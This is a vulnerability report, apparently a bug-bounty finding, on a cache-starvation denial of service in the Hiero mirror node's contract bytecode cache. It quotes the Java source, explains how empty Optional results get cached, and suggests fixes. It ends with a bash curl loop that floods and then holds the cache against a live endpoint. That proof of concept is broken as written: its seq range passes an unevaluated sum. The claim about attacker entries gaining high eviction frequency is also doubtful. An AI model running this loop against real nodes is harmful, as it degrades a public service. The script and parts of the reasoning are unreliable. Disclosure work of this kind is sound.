### Title
Cache Starvation DoS via Shared `CACHE_NAME_CONTRACT` Eviction — `findRuntimeBytecode()`

### Summary
The `findRuntimeBytecode()` method in `ContractRepository` uses a single shared Caffeine cache (`expireAfterAccess=1h, maximumSize=1000`) with no per-user or per-key isolation. An unprivileged attacker can fill all 1000 slots with arbitrary contract IDs (including non-existent ones, since `Optional.empty()` is not null and is therefore cached), then maintain those entries with a trivially low refresh rate (~0.28 RPS), permanently starving the target contract's bytecode from the cache and forcing every lookup to hit the database.

### Finding Description

**Exact code locations:**

`web3/src/main/java/org/hiero/mirror/web3/repository/ContractRepository.java`, lines 16–18:
```java
@Cacheable(cacheNames = CACHE_NAME_CONTRACT, cacheManager = CACHE_MANAGER_CONTRACT, unless = "#result == null")
@Query(value = "select runtime_bytecode from contract where id = :contractId", nativeQuery = true)
Optional<byte[]> findRuntimeBytecode(final Long contractId);
```

`web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java`, line 22:
```java
private String contract = "expireAfterAccess=1h,maximumSize=1000,recordStats";
```

`web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java`, lines 67–73:
```java
@Bean(CACHE_MANAGER_CONTRACT)
CacheManager cacheManagerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME_CONTRACT));
    caffeineCacheManager.setCacheSpecification(cacheProperties.getContract());
    return caffeineCacheManager;
}
```

**Root cause — two compounding flaws:**

1. **`unless = "#result == null"` does not exclude `Optional.empty()`**: The method return type is `Optional<byte[]>`. Spring's SpEL evaluates `#result == null` against the `Optional` wrapper itself, not its contents. `Optional.empty()` is a non-null object, so lookups for non-existent contract IDs are cached. An attacker does not need 1000 real contracts — 1000 fabricated/non-existent IDs suffice.

2. **`expireAfterAccess=1h` with `maximumSize=1000` on a shared, unauthenticated cache**: Caffeine's W-TinyLFU eviction policy compares the frequency of a new entry against the victim (least-recently-used entry in the probationary segment). If the attacker's 1000 entries have been accessed many times, their frequency scores are high. The target contract (first access, frequency ≈ 0) is either rejected outright or admitted briefly into the window segment (~10 slots) and immediately evicted before it can accumulate frequency. The net effect is the target is never durably cached.

**Exploit flow:**

1. Attacker sends 1000 `eth_call` requests targeting 1000 non-existent contract IDs (e.g., `contractId = 999999999001` through `999999999000 + 1000`). Each returns `Optional.empty()`, which is cached (not null).
2. Cache is now full (1000/1000 slots), all held by attacker-controlled IDs.
3. Attacker sends one refresh request per entry every ~3500 seconds (≈ 0.286 RPS total), well under the 500 RPS global limit and with no per-IP limit. This resets the `expireAfterAccess` timer, keeping all 1000 entries alive indefinitely.
4. Any legitimate request for the target contract's bytecode triggers a cache miss. Caffeine attempts to admit the target, but W-TinyLFU compares its frequency (0) against the attacker's entries (high). The target is evicted from the window segment before it can be promoted to the protected segment.
5. Every subsequent call to `findRuntimeBytecode(targetId)` hits the database.

**Why existing checks fail:**

- **Rate limiter** (`requestsPerSecond=500`, `gasPerSecond=7.5B`): The maintenance phase requires only ~0.286 RPS. The initial fill requires 1000 requests, which at 500 RPS completes in 2 seconds. Neither phase is blocked.
- **`unless = "#result == null"`**: Intended to avoid caching misses, but `Optional.empty() != null` in Java, so non-existent contract lookups are cached anyway.
- **No per-user/per-IP cache quota**: The cache is a single shared `CaffeineCacheManager` instance with no namespace or tenant isolation.

### Impact Explanation

Every call to `findRuntimeBytecode(targetId)` bypasses the cache and executes `SELECT runtime_bytecode FROM contract WHERE id = :contractId` against the database. The DB statement timeout is 3000ms. Under normal load this is a latency degradation; under concurrent load it can exhaust the DB connection pool for the target contract's callers. The attack is surgical — it targets a specific contract ID without affecting other contracts already in the cache, making it a targeted griefing vector. Severity matches the stated scope: medium, griefing, no direct economic loss.

### Likelihood Explanation

- No authentication or privileged access required — the `/api/v1/contracts/call` endpoint is public.
- Contract IDs on Hedera are sequential integers, publicly enumerable.
- Non-existent IDs work equally well, so no on-chain activity is needed.
- Maintenance cost is ~0.286 RPS, trivially sustainable from a single client.
- The attack is repeatable and self-sustaining as long as the attacker sends periodic refreshes.

### Recommendation

1. **Fix the `unless` condition**: Change `unless = "#result == null"` to `unless = "#result == null || !#result.isPresent()"` (or `unless = "#result?.isEmpty() ?: true"`) to prevent caching of empty `Optional` results. This removes the ability to fill the cache with non-existent IDs.

2. **Switch to `expireAfterWrite`**: Replace `expireAfterAccess=1h` with `expireAfterWrite=Xm` (e.g., 10–60 minutes). `expireAfterWrite` is not refreshed on reads, so an attacker cannot keep entries alive indefinitely with cheap read requests.

3. **Increase cache size or add per-contract-ID admission control**: A `maximumSize=1000` shared cache is trivially exhaustible. Increasing the size raises the bar; alternatively, use a separate cache namespace per caller or add a bloom-filter pre-check for known-valid contract IDs.

4. **Add per-IP or per-source rate limiting** at the ingress layer to prevent a single client from sustaining the maintenance traffic.

### Proof of Concept

```
# Step 1: Fill cache with 1000 non-existent contract IDs (completes in ~2s at 500 RPS)
for i in $(seq 999999999001 999999999000+1000); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d "{\"to\":\"0x$(printf '%040x' $i)\",\"data\":\"0x\",\"gas\":50000}" &
done
wait

# Step 2: Maintenance loop — access each entry once every ~55 minutes to reset expireAfterAccess
while true; do
  for i in $(seq 999999999001 999999999000+1000); do
    curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
      -H 'Content-Type: application/json' \
      -d "{\"to\":\"0x$(printf '%040x' $i)\",\"data\":\"0x\",\"gas\":50000}" &
    sleep 3.3  # 1000 requests / 3300s ≈ 0.3 RPS, well under 500 RPS limit
  done
done

# Result: All calls to the target contract (e.g., 0x0000...ABCD) now miss the cache
# and hit the database on every invocation, observable via cache miss metrics
# (recordStats is enabled) and increased DB query latency.
